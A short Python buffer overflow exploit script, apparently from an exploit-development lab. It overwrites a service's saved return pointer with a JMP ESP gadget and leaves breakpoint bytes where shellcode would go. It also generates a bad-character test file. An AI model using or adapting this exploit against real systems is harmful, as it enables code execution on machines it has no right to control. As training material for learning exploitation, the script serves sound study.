from socket import socket, SOCK_STREAM, AF_INET
from struct import pack

RHOST = '192.168.0.100'
RPORT = 31337

s = socket(AF_INET, SOCK_STREAM)
s.connect((RHOST, RPORT))

# find bad chars
test_chars = ''
bad_chars = [0x00, 0x0A]

# generate chars not in bad_chars
for c in range(0x00, 0xFF + 1):
    if c not in bad_chars:
        test_chars += chr(c)

# write test chars to binary file
with open('test_chars.bin', 'wb') as f:
    f.write(test_chars.encode())

buf_length = 1024
srp_offset = 146 	# stack return pointer offset obtained from msp pattern_create/offset
gadget_loc = 0x080416BF # JMP ESP instruction in program

buf = b'G' * srp_offset 			        # space before SRP
buf += pack('<I', gadget_loc) 			# overwrite srp with 4 bytes, conver to little endian
buf += b'\xCC\xCC\xCC'			        # ESP now points here (put bytecode here)
buf += b'J' * (buf_length - len(buf)) 	# fill rest of buffer
buf += b'\n'

s.send(buf)

print('We sent: ' + buf.decode('cp437'))
